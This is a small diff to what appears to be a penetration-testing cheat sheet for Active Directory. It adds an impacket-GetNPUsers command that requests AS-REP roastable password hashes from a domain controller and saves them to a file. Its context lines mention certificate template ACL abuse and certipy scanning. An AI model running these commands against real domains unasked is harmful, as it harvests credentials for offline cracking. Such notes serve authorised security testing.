@@ -65,6 +65,7 @@ Against single user:
 
 ```shell
 impacket-GetNPUsers $TARGET_DOMAIN/$TARGET_USER -no-pass
+impacket-GetNPUsers -dc-ip $TARGET_IP -request -outputfile hashes.asreproast $AD_DOMAIN/$USER
 ```
 
 Or if you got a shell on machine:
@@ -187,6 +188,7 @@ Set-ADCSTemplateACL -DisplayName Administrator2 -Type Allow -Identity '$AD_DOMAI
 ```
 Scan with certipy 4.4+ for vulnerable templates
 notes are in "Certificate Abuse" #Certificate-Abuse
+
 List Active Directory AD Users:
 ---
 #enumerate #ad #users
